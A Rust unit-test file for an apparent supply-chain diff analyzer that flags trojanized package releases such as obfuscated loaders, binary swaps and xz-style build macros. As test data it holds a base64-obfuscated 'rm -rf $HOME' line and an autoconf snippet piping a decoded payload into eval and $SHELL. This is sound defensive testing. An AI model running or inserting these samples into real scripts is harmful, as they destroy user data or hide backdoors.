//! Unit tests for the analysis module's detectors and helpers.

use std::collections::{BTreeMap, HashSet};
use std::path::Path;

use super::detectors::{
    binary_replacement_anomaly, changed_test_carrier, dependency_backed_public_api_anomaly,
    endgame_package_shape, executable_member_layout, gained_encoded_script_loading,
    gained_script_loading_with_host, is_compiled_binary_file_type, is_source_archive,
    opaque_runtime_payload_anomaly, restored_endgame_package_shape, runtime_graft_anomaly,
    source_build_macro_score, source_download_write_execute_anomaly,
};
use super::identity::{changed_identity_claims, identity_claim_fields};
use super::naming::clean_name;
use super::normalize::{
    Layout, normalized_archive_diff, normalized_member_path, npm_snapshot_member_key,
    python_distribution_member_key,
};
use super::remediation::{
    attack_behavior_removed, immediate_entry_return_count, removed_high_risk_traits,
};
use super::source::{archive_member_candidates, line_diff};
use super::summary::metric_change_importance;
use crate::Severity;
use crate::version::{Bump, BumpKind, Version};
use cleave::Criticality;
use cleave::types::{
    Changed, DiffReportV1, DiffSummary, FileDiffEntry, FileStatus, KvChange, MetricChange,
    ScopeDiff, ScopeDiffs, ScopeRocs, SectionChange, SymbolChange, TraitChange,
};

#[test]
fn entry_return_detection_requires_an_unconditional_first_statement() {
    let source = br#"<?php
        class Example {
        public function disabled() {
            return;
            dangerous_call();
        }
        function conditional() {
            if ($safe) return;
            dangerous_call();
        }
        function later() {
            setup();
            return;
        }
        }
    "#;
    assert_eq!(immediate_entry_return_count("example.php", source), 1);
}

#[test]
fn entry_return_detection_does_not_accept_documentation_as_code() {
    for source in [
        "<?php /*\nfunction example() {\nreturn;\n}\n*/\nlive_call();",
        "<?php $example = <<<'TEXT'\nfunction example() {\nreturn;\n}\nTEXT;\nlive_call();",
    ] {
        assert_eq!(
            immediate_entry_return_count("example.php", source.as_bytes()),
            0
        );
    }
}

#[test]
fn entry_return_detection_uses_syntax_not_line_layout() {
    for (path, source) in [
        (
            "example.php",
            "<?php function disabled() { /* explanation */ return; live_call(); }",
        ),
        (
            "example.js",
            "function disabled() { /* explanation */ return; liveCall(); }",
        ),
        (
            "example.ts",
            "function disabled(): void { return; liveCall(); }",
        ),
    ] {
        assert_eq!(
            immediate_entry_return_count(path, source.as_bytes()),
            1,
            "{path}"
        );
    }
}

#[test]
fn entry_return_detection_rejects_uncertain_or_active_bodies() {
    for source in [
        "<?php function active() { return dangerous_call(); }",
        "<?php function active() { if ($safe) return; dangerous_call(); }",
        "<?php function active() { setup(); return; }",
        "<?php function broken() { return;",
    ] {
        assert_eq!(
            immediate_entry_return_count("example.php", source.as_bytes()),
            0
        );
    }
    assert_eq!(
        immediate_entry_return_count("example.bin", &[0xff, 0, 0xfe]),
        0
    );
}

#[test]
fn canonical_sdist_member_reinserts_archive_version_for_extraction() {
    assert_eq!(
        archive_member_candidates(
            Path::new("guardrails_ai-0.10.1-RECONSTRUCTED.tar.gz"),
            "guardrails_ai/guardrails/__init__.py"
        ),
        [
            "guardrails_ai/guardrails/__init__.py",
            "guardrails_ai-0.10.1/guardrails/__init__.py"
        ]
    );
    assert_eq!(
        archive_member_candidates(Path::new("package.tgz"), "package/index.js"),
        ["package/index.js"]
    );
}

#[test]
fn auto_loaded_source_or_script_download_write_execute_chain_is_file_local() {
    let gained = |id: &str| TraitChange {
        id: id.to_string(),
        trait_section: "micro-behaviors".to_string(),
        crit: Criticality::Notable,
        conf: 1.0,
        desc: id.to_string(),
        count: 1,
    };
    let initializer = FileDiffEntry {
        scopes: ScopeDiffs {
            traits: Some(ScopeDiff {
                added: vec![
                    gained(
                        "micro-behaviors/communications/http/client/response-body::renamed-read",
                    ),
                    gained("micro-behaviors/fs/write/file/direct::python-write-response-read"),
                    gained("micro-behaviors/process/create/subprocess::subprocess-api-call"),
                    gained("micro-behaviors/os/sysinfo/platform/branch::renamed-check"),
                ],
                ..Default::default()
            }),
            ..Default::default()
        },
        ..crate::testkit::entry("<root>!!pkg/pkg/__init__.py", "python", FileStatus::Changed)
    };
    let report = |file: FileDiffEntry| DiffReportV1 {
        old_root: "old.tar.gz".to_string(),
        new_root: "new.tar.gz".to_string(),
        summary: DiffSummary {
            files_changed: 1,
            ..Default::default()
        },
        scopes: ScopeDiffs::default(),
        files: vec![file],
    };
    let patch = Some(Bump::new(BumpKind::Patch, 1));
    let minor = Some(Bump::new(BumpKind::Minor, 1));
    assert!(
        source_download_write_execute_anomaly(&report(initializer.clone()), patch, &HashSet::new())
            .is_some()
    );
    assert!(
        source_download_write_execute_anomaly(&report(initializer.clone()), minor, &HashSet::new())
            .is_none()
    );

    let mut ordinary_helper = initializer.clone();
    ordinary_helper.path = "<root>!!pkg/pkg/updater.py".to_string();
    assert!(
        source_download_write_execute_anomaly(&report(ordinary_helper), patch, &HashSet::new())
            .is_none()
    );

    let mut shell_entrypoint = initializer;
    shell_entrypoint.path = "<root>!!pkg/install.sh".to_string();
    shell_entrypoint.file_type = Some("shell".to_string());
    assert!(
        source_download_write_execute_anomaly(
            &report(shell_entrypoint),
            patch,
            &HashSet::from(["pkg/install.sh".to_string()]),
        )
        .is_some()
    );
}

#[test]
fn patch_public_api_expansion_requires_floating_young_dependency() {
    let package = FileDiffEntry {
        scopes: ScopeDiffs {
            kv: Some(ScopeDiff {
                added: vec![KvChange {
                    path: "dependencies.flatmap-stream".to_string(),
                    namespace: "dependencies".to_string(),
                    value: serde_json::Value::String("^0.1.0".to_string()),
                }],
                ..Default::default()
            }),
            ..Default::default()
        },
        ..crate::testkit::entry(
            "<root>!!package/package.json",
            "package.json",
            FileStatus::Changed,
        )
    };
    let entrypoint = FileDiffEntry {
        scopes: ScopeDiffs {
            symbols: Some(ScopeDiff {
                added: vec![
                    SymbolChange {
                        symbol: "flatmap-stream".to_string(),
                        ..Default::default()
                    },
                    SymbolChange {
                        symbol: "exports.flatmap".to_string(),
                        ..Default::default()
                    },
                ],
                ..Default::default()
            }),
            ..Default::default()
        },
        ..crate::testkit::entry(
            "<root>!!package/index.js",
            "javascript",
            FileStatus::Changed,
        )
    };
    let report = |spec: &str| {
        let mut package = package.clone();
        package.scopes.kv.as_mut().unwrap().added[0].value =
            serde_json::Value::String(spec.to_string());
        DiffReportV1 {
            old_root: "old.tgz".to_string(),
            new_root: "new.tgz".to_string(),
            summary: DiffSummary {
                files_changed: 2,
                ..Default::default()
            },
            scopes: ScopeDiffs::default(),
            files: vec![package, entrypoint.clone()],
        }
    };
    let patch = Some(Bump::new(BumpKind::Patch, 1));
    let minor = Some(Bump::new(BumpKind::Minor, 1));
    let entrypoints = HashSet::from(["package/index.js".to_string()]);
    assert!(dependency_backed_public_api_anomaly(&report("^0.1.0"), patch, &entrypoints).is_some());
    assert!(dependency_backed_public_api_anomaly(&report("0.1.0"), patch, &entrypoints).is_none());
    assert!(dependency_backed_public_api_anomaly(&report("^0.1.0"), minor, &entrypoints).is_none());
}

#[test]
fn underscore_version_is_removed_cleanly_from_executable_name() {
    let version = Version::detect("ClassicShellSetup_4_3_0.exe").unwrap();
    assert_eq!(
        clean_name("ClassicShellSetup_4_3_0.exe", Some(&version)),
        "ClassicShellSetup.exe"
    );
}

#[test]
fn same_version_binary_replacement_uses_file_type_and_cross_scope_metrics() {
    let metric = |path: &str, old: f64, new: f64| Changed {
        old: MetricChange {
            path: path.to_string(),
            value: serde_json::json!(old),
        },
        new: MetricChange {
            path: path.to_string(),
            value: serde_json::json!(new),
        },
    };
    let diff = DiffReportV1 {
        old_root: "old".to_string(),
        new_root: "new".to_string(),
        summary: DiffSummary {
            files_changed: 1,
            overall_roc: 0.70,
            scope_roc: ScopeRocs {
                metrics: 0.40,
                ..Default::default()
            },
            ..Default::default()
        },
        scopes: Default::default(),
        files: vec![FileDiffEntry {
            scopes: ScopeDiffs {
                metrics: Some(ScopeDiff {
                    changed: vec![
                        metric("binary.overlay_entropy", 7.4, 3.8),
                        metric("binary.is_pie", 1.0, 0.0),
                        metric("imports.count", 97.0, 31.0),
                        metric("sections.code_size", 50_176.0, 3_584.0),
                        metric("sections.count", 5.0, 13.0),
                    ],
                    ..Default::default()
                }),
                sections: Some(ScopeDiff {
                    added: vec![SectionChange::default()],
                    ..Default::default()
                }),
                symbols: Some(ScopeDiff {
                    removed: vec![SymbolChange::default()],
                    ..Default::default()
                }),
                ..Default::default()
            },
            ..crate::testkit::entry(
                "payload.without-an-executable-extension",
                "pe",
                FileStatus::Changed,
            )
        }],
    };
    let same = Some(Bump::new(BumpKind::Same, 0));
    assert!(binary_replacement_anomaly(&diff, same).is_some());

    let patch = Some(Bump::new(BumpKind::Patch, 1));
    assert!(binary_replacement_anomaly(&diff, patch).is_none());

    let mut source = diff;
    source.files[0].file_type = Some("c".to_string());
    assert!(binary_replacement_anomaly(&source, same).is_none());
}

#[test]
fn patch_runtime_entrypoint_to_opaque_added_source_uses_graph_and_metrics() {
    let added_metric = |path: &str, value: f64| MetricChange {
        path: path.to_string(),
        value: serde_json::json!(value),
    };
    let changed_metric = |path: &str, old: f64, new: f64| Changed {
        old: added_metric(path, old),
        new: added_metric(path, new),
    };
    let diff = DiffReportV1 {
        old_root: "old.tgz".to_string(),
        new_root: "new.tgz".to_string(),
        summary: DiffSummary {
            files_added: 1,
            files_changed: 2,
            overall_roc: 0.72,
            ..Default::default()
        },
        scopes: Default::default(),
        files: vec![
            FileDiffEntry {
                scopes: ScopeDiffs {
                    metrics: Some(ScopeDiff {
                        changed: vec![changed_metric("file.size_bytes", 3_532.0, 6_803.0)],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                ..crate::testkit::entry("<root>", "npm", FileStatus::Changed)
            },
            FileDiffEntry {
                scopes: ScopeDiffs {
                    kv: Some(ScopeDiff {
                        added: vec![KvChange {
                            path: "source.strings[0]".to_string(),
                            namespace: "source".to_string(),
                            value: serde_json::json!("./test/data"),
                        }],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                ..crate::testkit::entry(
                    "<root>!!package/index.min.js",
                    "javascript",
                    FileStatus::Changed,
                )
            },
            FileDiffEntry {
                scopes: ScopeDiffs {
                    metrics: Some(ScopeDiff {
                        added: vec![
                            added_metric("file.size", 5_781.0),
                            added_metric("text.total_lines", 1.0),
                            added_metric("text.max_line_length", 5_781.0),
                            added_metric("text.encoded_string_ratio", 0.8),
                            added_metric("strings.max_length", 4_352.0),
                            added_metric("text.digit_ratio", 0.62),
                        ],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                ..crate::testkit::entry(
                    "<root>!!package/test/data.js",
                    "javascript",
                    FileStatus::Added,
                )
            },
        ],
    };
    let patch = Some(Bump::new(BumpKind::Patch, 1));
    let entrypoints = HashSet::from(["package/index.min.js".to_string()]);
    let anomaly = opaque_runtime_payload_anomaly(&diff, patch, &entrypoints).unwrap();
    assert_eq!(anomaly.payload, "<root>!!package/test/data.js");

    assert!(opaque_runtime_payload_anomaly(&diff, patch, &HashSet::new()).is_none());
    let minor = Some(Bump::new(BumpKind::Minor, 1));
    assert!(opaque_runtime_payload_anomaly(&diff, minor, &entrypoints).is_none());
}

#[test]
fn timestamp_clustered_runtime_graft_uses_identity_graph_and_raw_facts() {
    let kv = |path: &str, value: serde_json::Value| KvChange {
        path: path.to_string(),
        namespace: path.split('.').next().unwrap_or_default().to_string(),
        value,
    };
    let diff = DiffReportV1 {
        old_root: "old.zip".to_string(),
        new_root: "new.zip".to_string(),
        summary: DiffSummary {
            files_added: 1,
            files_changed: 2,
            overall_roc: 0.59,
            ..Default::default()
        },
        scopes: Default::default(),
        files: vec![
            FileDiffEntry {
                scopes: ScopeDiffs {
                    kv: Some(ScopeDiff {
                        added: vec![
                            kv(
                                "archive.timing.mtime_outlier_members[]",
                                serde_json::json!("plugin/plugin.php"),
                            ),
                            kv(
                                "archive.timing.mtime_outlier_members[]",
                                serde_json::json!("plugin/payload.php"),
                            ),
                        ],
                        changed: vec![Changed {
                            old: kv(
                                "archive.timing.mtime_spread_seconds",
                                serde_json::json!(50_000),
                            ),
                            new: kv(
                                "archive.timing.mtime_spread_seconds",
                                serde_json::json!(100),
                            ),
                        }],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                ..crate::testkit::entry("<root>", "zip", FileStatus::Changed)
            },
            FileDiffEntry {
                scopes: ScopeDiffs {
                    kv: Some(ScopeDiff {
                        added: vec![kv("source.strings[0]", serde_json::json!("/payload.php"))],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                ..crate::testkit::entry("<root>!!plugin/plugin.php", "php", FileStatus::Changed)
            },
            FileDiffEntry {
                scopes: ScopeDiffs {
                    metrics: Some(ScopeDiff {
                        added: vec![MetricChange {
                            path: "file.size".to_string(),
                            value: serde_json::json!(1_518),
                        }],
                        ..Default::default()
                    }),
                    kv: Some(ScopeDiff {
                        added: vec![
                            kv(
                                "source.strings[0]",
                                serde_json::json!("https://example.invalid/pixel"),
                            ),
                            kv(
                                "source.strings[1]",
                                serde_json::json!("/runtime/system/file.php"),
                            ),
                        ],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                ..crate::testkit::entry("<root>!!plugin/payload.php", "php", FileStatus::Added)
            },
        ],
    };
    let patch = Some(Bump::new(BumpKind::Patch, 1));
    let entrypoints = HashSet::from(["plugin/plugin.php".to_string()]);
    assert!(runtime_graft_anomaly(&diff, patch, &entrypoints).is_some());

    let mut broad_timestamps = diff;
    broad_timestamps.files[0]
        .scopes
        .kv
        .as_mut()
        .unwrap()
        .changed[0]
        .new
        .value = serde_json::json!(10_000);
    assert!(runtime_graft_anomaly(&broad_timestamps, patch, &entrypoints).is_none());
}

#[test]
fn metric_ranking_does_not_treat_zero_to_one_as_infinite() {
    assert!(metric_change_importance(0.0, 6.0) > metric_change_importance(0.0, 1.0));
    assert!(metric_change_importance(100.0, 10.0) > metric_change_importance(0.0, 1.0));
}

#[test]
fn attack_removal_requires_strong_disappearing_traits_and_no_replacement() {
    let finding = |id: &str, crit| TraitChange {
        id: id.to_string(),
        trait_section: "objectives".to_string(),
        crit,
        conf: 1.0,
        desc: id.to_string(),
        count: 1,
    };
    let make_diff = |removed| DiffReportV1 {
        old_root: "affected.tgz".to_string(),
        new_root: "fixed.tgz".to_string(),
        summary: DiffSummary::default(),
        scopes: ScopeDiffs::default(),
        files: vec![FileDiffEntry {
            scopes: ScopeDiffs {
                traits: Some(ScopeDiff {
                    removed,
                    ..Default::default()
                }),
                ..Default::default()
            },
            ..crate::testkit::entry("workflow.yml", "yaml", FileStatus::Changed)
        }],
    };

    let hostile = make_diff(vec![finding(
        "objectives/supply-chain/trojanized/build-pipeline::encoded-shell",
        Criticality::Hostile,
    )]);
    assert_eq!(removed_high_risk_traits(&hostile).len(), 1);
    assert!(attack_behavior_removed(&hostile, Severity::Medium));
    assert!(!attack_behavior_removed(&hostile, Severity::High));

    let weak = make_diff(vec![finding(
        "objectives/anti-static/obfuscation::one-clue",
        Criticality::Suspicious,
    )]);
    assert!(!attack_behavior_removed(&weak, Severity::None));

    let joined = make_diff(vec![
        finding(
            "objectives/anti-static/obfuscation::encoded-shell",
            Criticality::Suspicious,
        ),
        finding(
            "objectives/supply-chain/trojanized/build-pipeline::oidc-shell",
            Criticality::Suspicious,
        ),
        finding(
            "micro-behaviors/process/create::ordinary-exec",
            Criticality::Notable,
        ),
    ]);
    assert_eq!(removed_high_risk_traits(&joined).len(), 2);
    assert!(attack_behavior_removed(&joined, Severity::None));
}

#[test]
fn endgame_shape_requires_behavioral_collapse_not_just_cleanup() {
    let faker = DiffSummary {
        files_removed: 1_785,
        files_added: 0,
        files_changed: 2,
        overall_roc: 1.0,
        scope_roc: ScopeRocs {
            traits: 0.99,
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(endgame_package_shape(&faker));

    let ordinary_cleanup = DiffSummary {
        scope_roc: ScopeRocs {
            traits: 0.20,
            ..Default::default()
        },
        ..faker
    };
    assert!(!endgame_package_shape(&ordinary_cleanup));
}

#[test]
fn restoration_shape_requires_the_broken_entrypoint_to_be_repaired() {
    let removed_trait = |id: &str| TraitChange {
        id: id.to_string(),
        trait_section: "metadata".to_string(),
        crit: Criticality::Notable,
        conf: 1.0,
        desc: "declared entrypoint absent".to_string(),
        count: 1,
    };
    let make_diff = |id: &str| DiffReportV1 {
        old_root: "stripped.tgz".to_string(),
        new_root: "restored.tgz".to_string(),
        summary: DiffSummary {
            files_added: 1_785,
            files_changed: 2,
            overall_roc: 1.0,
            scope_roc: ScopeRocs {
                traits: 0.99,
                ..Default::default()
            },
            ..Default::default()
        },
        scopes: Default::default(),
        files: vec![FileDiffEntry {
            scopes: ScopeDiffs {
                traits: Some(ScopeDiff {
                    removed: vec![removed_trait(id)],
                    ..Default::default()
                }),
                ..Default::default()
            },
            ..crate::testkit::entry("<root>", "", FileStatus::Changed)
        }],
    };

    assert!(restored_endgame_package_shape(&make_diff(
        "metadata/package/files/missing-entrypoint::arbitrary-local-name"
    )));
    assert!(!restored_endgame_package_shape(&make_diff(
        "metadata/package/files::ordinary-tree-change"
    )));
}

#[test]
fn obfuscated_remote_loader_requires_convergence_on_one_file() {
    let trait_change = |hierarchy: &str| TraitChange {
        id: format!("{hierarchy}::arbitrary-local-name"),
        trait_section: "micro-behaviors".to_string(),
        crit: Criticality::Notable,
        conf: 1.0,
        desc: hierarchy.to_string(),
        count: 1,
    };
    let make_diff = |ids: &[&str]| DiffReportV1 {
        old_root: "old.tgz".to_string(),
        new_root: "new.tgz".to_string(),
        summary: Default::default(),
        scopes: Default::default(),
        files: vec![FileDiffEntry {
            scopes: ScopeDiffs {
                traits: Some(ScopeDiff {
                    added: ids.iter().map(|id| trait_change(id)).collect(),
                    ..Default::default()
                }),
                ..Default::default()
            },
            ..crate::testkit::entry(
                "<root>!!package/browser.js",
                "javascript",
                FileStatus::Changed,
            )
        }],
    };
    let complete = [
        "micro-behaviors/data/encode/char-code",
        "micro-behaviors/process/create/load/script",
    ];
    assert!(gained_encoded_script_loading(&make_diff(&complete)));
    assert!(!gained_script_loading_with_host(&make_diff(&complete)));
    for omitted in &complete {
        let partial = complete
            .iter()
            .copied()
            .filter(|id| id != omitted)
            .collect::<Vec<_>>();
        assert!(!gained_encoded_script_loading(&make_diff(&partial)));
    }

    let literal = [
        "micro-behaviors/communications/http/url/domain",
        "micro-behaviors/process/create/load/script",
    ];
    assert!(gained_script_loading_with_host(&make_diff(&literal)));
    assert!(!gained_encoded_script_loading(&make_diff(&literal)));
    for omitted in &literal {
        let partial = literal
            .iter()
            .copied()
            .filter(|id| id != omitted)
            .collect::<Vec<_>>();
        assert!(!gained_script_loading_with_host(&make_diff(&partial)));
    }
}

#[test]
fn terminal_claim_diff_omits_unchanged_root_identity_and_version() {
    let identity = |version: &str, organization: Option<&str>| {
        let mut identity = filefacts::Identity::default();
        identity.name = Some(filefacts::Claim::claimed("node-ipc", "test"));
        identity.identifier = Some(filefacts::Claim::claimed("node-ipc", "test"));
        identity.version = Some(filefacts::Claim::claimed(version, "test"));
        identity.organization = organization.map(|value| filefacts::Claim::claimed(value, "test"));
        identity
    };
    let old = identity("12.0.0", None);
    let new = identity("12.0.1", None);
    let old_fields = identity_claim_fields(&old, false);
    let new_fields = identity_claim_fields(&new, false);
    assert!(changed_identity_claims("<root>", &old_fields, &new_fields).is_empty());

    let changed = identity("12.0.1", Some("new publisher"));
    let changed_fields = identity_claim_fields(&changed, false);
    assert_eq!(
        changed_identity_claims("<root>", &new_fields, &changed_fields),
        vec!["<root>: + organization new publisher [claimed]"]
    );

    // A member version is still available when it is not duplicated by
    // the artifact masthead.
    let member_fields: BTreeMap<_, _> = identity_claim_fields(&new, true);
    assert_eq!(
        member_fields.get("version").map(String::as_str),
        Some("12.0.1 [claimed]")
    );
}

#[test]
fn line_diff_marks_additions_removals_and_context() {
    // gentoo-shaped edit: one line replaced, one added; the rest is context.
    let old = b"#!/bin/bash\nexec meson build\n";
    let new = b"#!/bin/bash\nmeson=`base64 -d <<< L2Jpbi9ybQo=`\nexec ${meson} -rf $HOME\n";
    let d = line_diff(old, new);
    // Context line is unmarked; both new lines are `+`; the replaced old
    // line surfaces as `-`.
    assert!(d.contains("  #!/bin/bash"), "context line kept: {d}");
    assert!(
        d.contains("+ meson=`base64 -d <<< L2Jpbi9ybQo=`"),
        "added: {d}"
    );
    assert!(d.contains("+ exec ${meson} -rf $HOME"), "added: {d}");
    assert!(d.contains("- exec meson build"), "removed: {d}");
}

#[test]
fn line_diff_neutralizes_control_chars() {
    // A crafted line can't smuggle a terminal escape into the payload.
    let d = line_diff(b"", b"evil\x1b[31mred\n");
    assert!(!d.contains('\x1b'), "escape must be neutralized: {d:?}");
}

#[test]
fn package_root_churn_does_not_hide_replacements() {
    assert_eq!(
        normalized_member_path("<root>!!HandBrake-1.0.7/HandBrake.app/Contents/MacOS/HandBrake"),
        "<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"
    );
    assert_eq!(
        normalized_member_path("<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"),
        "<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"
    );
    assert_ne!(
        normalized_member_path("<root>!!foo-1.0/bin/tool"),
        normalized_member_path("<root>!!bar-1.0/bin/tool")
    );
    assert_eq!(normalized_member_path("src/main.c"), "src/main.c");
    assert_eq!(
        normalized_member_path("<root>!!outer-1.0/plugins/payload.zip!!inner-2.0/bin/run"),
        "<root>!!outer/plugins/payload.zip!!inner/bin/run"
    );
    assert_eq!(
        normalized_member_path("<root>!!bfunky-http-parser-0cdd2ea/src/Parser.php"),
        "<root>!!bfunky-http-parser/src/Parser.php"
    );
    assert_eq!(
        normalized_member_path("<root>!!bfunky-http-parser-0e52069/src/Parser.php"),
        "<root>!!bfunky-http-parser/src/Parser.php"
    );
    assert_eq!(
        normalized_member_path("<root>!!release-1234567/src/Parser.php"),
        "<root>!!release-1234567/src/Parser.php"
    );
}

#[test]
fn versioned_member_roots_are_merged_before_judging() {
    let trait_change = |id: &str| TraitChange {
        id: id.to_string(),
        trait_section: "micro-behaviors".to_string(),
        crit: Criticality::Notable,
        conf: 1.0,
        desc: "same trait".to_string(),
        count: 1,
    };
    let old = FileDiffEntry {
        scopes: ScopeDiffs {
            traits: Some(ScopeDiff {
                removed: vec![trait_change("micro-behaviors/example::same")],
                old_count: 1,
                old_weight: 1.0,
                change_weight: 1.0,
                ..Default::default()
            }),
            ..Default::default()
        },
        ..crate::testkit::entry("<root>!!widget-1.0.0/lib/a.php", "php", FileStatus::Removed)
    };
    let new = FileDiffEntry {
        scopes: ScopeDiffs {
            traits: Some(ScopeDiff {
                added: vec![trait_change("micro-behaviors/example::same")],
                new_count: 1,
                new_weight: 1.0,
                change_weight: 1.0,
                ..Default::default()
            }),
            ..Default::default()
        },
        ..crate::testkit::entry("<root>!!widget-1.0.1/lib/a.php", "php", FileStatus::Added)
    };
    let raw = DiffReportV1 {
        old_root: "old.zip".to_string(),
        new_root: "new.zip".to_string(),
        summary: Default::default(),
        scopes: Default::default(),
        files: vec![old, new],
    };
    let judged = normalized_archive_diff(&raw);
    assert_eq!(judged.files.len(), 1);
    assert_eq!(judged.files[0].status, FileStatus::Unchanged);
    let traits = judged.files[0].scopes.traits.as_ref().unwrap();
    assert!(traits.added.is_empty());
    assert!(traits.removed.is_empty());
    assert!(traits.changed.is_empty());
}

#[test]
fn npm_package_root_pairs_with_versioned_source_snapshot() {
    let old = FileDiffEntry {
        old_formula: Some("clean".to_string()),
        ..crate::testkit::entry(
            "<root>!!flatmap-stream-0.1.0/index.min.js",
            "javascript",
            FileStatus::Removed,
        )
    };
    let new = FileDiffEntry {
        new_formula: Some("payload".to_string()),
        ..crate::testkit::entry(
            "<root>!!package/index.min.js",
            "javascript",
            FileStatus::Added,
        )
    };
    let raw = DiffReportV1 {
        old_root: "flatmap-stream-0.1.0-github.tar.gz".to_string(),
        new_root: "flatmap-stream-0.1.1.tgz".to_string(),
        summary: Default::default(),
        scopes: Default::default(),
        files: vec![old, new],
    };
    let judged = normalized_archive_diff(&raw);
    assert_eq!(judged.files.len(), 1);
    assert_eq!(judged.files[0].path, "<root>!!package/index.min.js");
    assert_eq!(judged.files[0].old_formula.as_deref(), Some("clean"));
    assert_eq!(judged.files[0].new_formula.as_deref(), Some("payload"));
}

#[test]
fn npm_snapshot_key_distinguishes_package_root() {
    assert_eq!(
        npm_snapshot_member_key("<root>!!foo-1.0/bin/tool"),
        Some((Layout::VersionedRoot, "bin/tool".to_string()))
    );
    assert_eq!(
        npm_snapshot_member_key("<root>!!package/bin/tool"),
        Some((Layout::NpmPackage, "bin/tool".to_string()))
    );
    assert_eq!(npm_snapshot_member_key("<root>!!foo/bin/tool"), None);
}

#[test]
fn python_sdist_src_pairs_with_flat_wheel_package() {
    let old = FileDiffEntry {
        path: "<root>!!telnyx/_client.py".to_string(),
        file_type: Some("python".to_string()),
        status: FileStatus::Removed,
        identity: None,
        scopes: ScopeDiffs::default(),
        old_formula: Some("clean".to_string()),
        new_formula: None,
    };
    let new = FileDiffEntry {
        path: "<root>!!telnyx-4.87.1/src/telnyx/_client.py".to_string(),
        file_type: Some("python".to_string()),
        status: FileStatus::Added,
        identity: None,
        scopes: ScopeDiffs::default(),
        old_formula: None,
        new_formula: Some("payload".to_string()),
    };
    let raw = DiffReportV1 {
        old_root: "telnyx-4.87.0-py3-none-any.whl".to_string(),
        new_root: "telnyx-4.87.1.tar.gz".to_string(),
        summary: Default::default(),
        scopes: Default::default(),
        files: vec![old, new],
    };
    let judged = normalized_archive_diff(&raw);
    assert_eq!(judged.files.len(), 1);
    // The synthetic entries carry no scope deltas, so the merged status is
    // unchanged; the formulas prove the two archive members were paired.
    assert_eq!(judged.files[0].status, FileStatus::Unchanged);
    assert_eq!(judged.files[0].old_formula.as_deref(), Some("clean"));
    assert_eq!(judged.files[0].new_formula.as_deref(), Some("payload"));

    assert_eq!(
        python_distribution_member_key("<root>!!telnyx-4.87.1/src/telnyx/_client.py"),
        Some((Layout::SdistSrc, "telnyx/_client.py".to_string()))
    );
    assert_eq!(
        python_distribution_member_key("<root>!!telnyx/_client.py"),
        Some((Layout::Flat, "telnyx/_client.py".to_string()))
    );
    assert_eq!(
        python_distribution_member_key("<root>!!telnyx-4.87.0.dist-info/METADATA"),
        None
    );
}

#[test]
fn payload_selection_uses_content_type_before_names() {
    assert!(is_compiled_binary_file_type(filefacts::FileType::MachO));
    assert!(!is_compiled_binary_file_type(filefacts::FileType::Php));
    assert!(!is_compiled_binary_file_type(filefacts::FileType::Data));
    assert!(!executable_member_layout("pkg!!cache/payload.bin"));
    assert!(executable_member_layout(
        "pkg!!App.app/Contents/MacOS/launch"
    ));
}

#[test]
fn source_build_macro_signal_requires_joined_execution_clues() {
    let malicious = b"AC_CONFIG_COMMANDS([build-to-host], [eval $stage | $SHELL])\ncarrier=`grep -aErls marker $srcdir/`\nconfig='sed r $carrier | eval $map | $decoder -d'\nmap='tr abc xyz'";
    let ordinary = b"AC_DEFUN([gl_BUILD_TO_HOST], [AC_SUBST([$1_c_make])])\nvalue=`echo ok`";
    assert!(source_build_macro_score(malicious));
    assert!(!source_build_macro_score(ordinary));
}

#[test]
fn changed_test_carrier_requires_compression_and_test_context() {
    let entry = |path: &str, status| crate::testkit::entry(path, "", status);
    assert!(changed_test_carrier(&entry(
        "<root>!!pkg-2/tests/files/carrier.lzma",
        FileStatus::Changed,
    )));
    assert!(!changed_test_carrier(&entry(
        "<root>!!pkg-2/tests/files/carrier.lzma",
        FileStatus::Unchanged,
    )));
    assert!(!changed_test_carrier(&entry(
        "<root>!!pkg-2/assets/carrier.lzma",
        FileStatus::Changed,
    )));
    assert!(!changed_test_carrier(&entry(
        "<root>!!pkg-2/tests/files/README",
        FileStatus::Changed,
    )));
}

#[test]
fn source_archive_detection_is_limited_to_tarball_forms() {
    assert!(is_source_archive(std::path::Path::new("xz-5.6.0.tar.xz")));
    assert!(is_source_archive(std::path::Path::new("pkg.tar.gz")));
    assert!(!is_source_archive(std::path::Path::new("pkg.tgz")));
    assert!(!is_source_archive(std::path::Path::new("source-tree")));
}
